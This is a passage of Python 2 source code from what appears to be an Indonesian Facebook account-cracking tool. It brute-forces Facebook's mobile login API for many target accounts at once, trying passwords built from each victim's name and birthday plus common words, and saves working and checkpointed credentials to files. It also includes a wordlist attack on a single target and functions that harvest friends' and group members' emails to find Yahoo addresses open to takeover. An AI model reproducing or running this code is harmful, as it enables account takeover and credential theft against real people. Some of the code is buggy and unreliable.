            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    checkpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        checkpoint.append(user + pass3)
                    else:
                        lahir = b['birthday']
                        pass4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            checkpoint.append(user + pass4)
                        else:
                            pass5 = ('sayang123', 'sayangku123')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                checkpoint.append(user + pass5)
                            else:
                                pass6 = ('bintang123', 'bintang12345')
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    checkpoint.append(user + pass6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + fb_token)
                                    b = json.loads(a.text)
                                    pass7 = ('1234567890', 'password123', 'michelle',
                                             'someone', '', 'iloveyou', 'princess',
                                             'playboy')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass7 + ' =>' + z['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        checkpoint.append(user + pass7)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + fb_token)
                                        b = json.loads(a.text)
                                        pass8 = ('january', 'february', 'march', 'april',
                                                 'may', 'june', 'july', 'august',
                                                 'september', 'november', 'december')
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass8 + ' =>' + z['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            checkpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal OK/CP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(checkpoint))
    print '\x1b[1;91m[+] \x1b[1;92mCP File saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()


def brute():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Tidak Ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    try:
        email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
        total = open(passw, 'r')
        total = total.readlines()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
        print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        sandi = open(passw, 'r')
        for pw in sandi:
            try:
                pw = pw.replace('\n', '')
                sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;91m: \x1b[1;97m' + pw)
                sys.stdout.flush()
                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                mpsh = json.loads(data.text)
                if 'access_token' in mpsh:
                    dapat = open('Brute.txt', 'w')
                    dapat.write(email + ' | ' + pw + '\n')
                    dapat.close()
                    print ''
                    print '\n\x1b[1;91m[+] \x1b[1;92Berhasil'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                    failed()
                elif 'www.facebook.com' in mpsh['error_msg']:
                    ceks = open('Brutecheckpoint.txt', 'w')
                    ceks.write(email + ' | ' + pw + '\n')
                    ceks.close()
                    print ''
                    print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                    failed()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;91m[!] Connection Error'
                time.sleep(0.01)

    except IOError:
        print '\x1b[1;91m[!] File Tidak Ditemukan'
        tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mCreate wordlist ? \x1b[1;92m[y/n]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Wrong'
        tanyaw()
    elif why == 'y':
        wordlist()
    elif why == 'Y':
        wordlist()
    elif why == 'n':
        menu_hack()
    elif why == 'N':
        menu_hack()
    else:
        print '\x1b[1;91m[!] Wrong'
        tanyaw()


def menu_yahoo():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Tidak Ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Clone Dari Teman'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Clone Dari Member Grub'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;91m0.\x1b[1;97m Back'
    print '\xe2\x95\x91'
    choose_yahoo()


def choose_yahoo():
    go = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if go == '':
        print '\x1b[1;91m[!] Wrong'
        choose_yahoo()
    elif go == '1':
        yahoofromfriends()
    elif go == '2':
        yahoomember()
    elif go == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[!] Wrong'
        choose_yahoo()


def yahoofriends():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Tidak Ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil Email Teman \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + fb_token)
    kimak = json.loads(friends.text)
    save = open('out/MailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        fb_name = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + fb_token)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                click = br.submit().read()
                seat = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = seat.search(click).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + fb_name
                    sucessful.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(sucessful))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoofromfriends():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    mpsh = []
    jml = 0
    idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan Id Teman \x1b[1;91m: \x1b[1;97m')
    try:
        seat = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + fb_token)
        op = json.loads(seat.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;91m[!] Teman Tidak Diketahui'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_yahoo()

    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil Email Dari Teman \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + fb_token)
    kimak = json.loads(friends.text)
    save = open('out/FriendMailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        fb_name = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + fb_token)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                click = br.submit().read()
                seat = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = seat.search(click).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + fb_name
                    sucessful.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(sucessful))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FriendMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoomember():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    mpsh = []
    jml = 0
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan Id Grub \x1b[1;91m:\x1b[1;97m ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + fb_token)
        asw = json.loads(r.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama Group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;91m[!] Group Tidak Ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_yahoo()

    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGetting email from group \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + fb_token)
    kimak = json.loads(friends.text)
    save = open('out/groupMailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        fb_name = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + fb_token)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                click = br.submit().read()
                seat = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = seat.search(click).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + fb_name
                    sucessful.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(sucessful))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/groupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


if __name__ == '__main__':
    tool_main_function()